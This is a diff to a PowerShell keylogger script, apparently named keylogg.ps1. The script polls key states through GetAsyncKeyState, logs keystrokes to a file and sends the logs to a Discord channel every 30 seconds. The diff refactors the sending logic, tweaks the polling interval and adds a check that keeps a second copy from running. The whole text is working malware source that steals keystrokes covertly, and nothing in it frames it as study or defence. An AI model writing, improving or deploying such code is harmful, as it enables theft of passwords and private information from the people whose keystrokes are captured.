@@ -46,20 +46,13 @@ function LogKeystrokesToFile {
 
 function SendKeylogsFromFile {
     try {
-        $keylogs = Get-Content -Path $keylogFilePath -Raw
-        
-        Send-DiscordMessage -Content $keylogs
-        
-        Remove-Item -Path $keylogFilePath -Force
-    }
-    catch {
-        Write-Host "Error occurred: $_"
-    }
-}
-
-function SendSmallMessage {
-    try {
-        Send-DiscordMessage -Content "No keystrokes recorded in the last 30 seconds."
+        if (Test-Path $keylogFilePath) {
+            $keylogs = Get-Content -Path $keylogFilePath -Raw
+            Send-DiscordMessage -Content $keylogs
+            Remove-Item -Path $keylogFilePath -Force
+        } else {
+            Send-DiscordMessage -Content "No keystrokes recorded in the last 30 seconds."
+        }
     }
     catch {
         Write-Host "Error occurred: $_"
@@ -68,8 +61,10 @@ function SendSmallMessage {
 
 function KeyLogger {
     $buffer = ""
+    $sendTime = (Get-Date).AddSeconds(30)
+
     while ($true) {
-        Start-Sleep -Milliseconds 40
+        Start-Sleep -Milliseconds 50
 
         for ($ascii = 9; $ascii -le 254; $ascii++) {
             $keystate = $API::GetAsyncKeyState($ascii)
@@ -93,18 +88,14 @@ function KeyLogger {
             LogKeystrokesToFile -Content $buffer.Trim()
             $buffer = ""  
         }
-        
+
         if ((Get-Date) -ge $sendTime) {
-            if ([string]::IsNullOrEmpty($buffer)) {
-                SendSmallMessage
-            } else {
-                SendKeylogsFromFile
-            }
-            $sendTime = (Get-Date).AddSeconds(30)  
+            SendKeylogsFromFile
+            $sendTime = (Get-Date).AddSeconds(30)
         }
     }
 }
 
-$sendTime = (Get-Date).AddSeconds(30)
-
-KeyLogger
+if (-not [System.Diagnostics.Process]::GetProcessesByName("powershell").Where({$_.MainWindowTitle -match 'keylogg.ps1'})) {
+    KeyLogger
+}
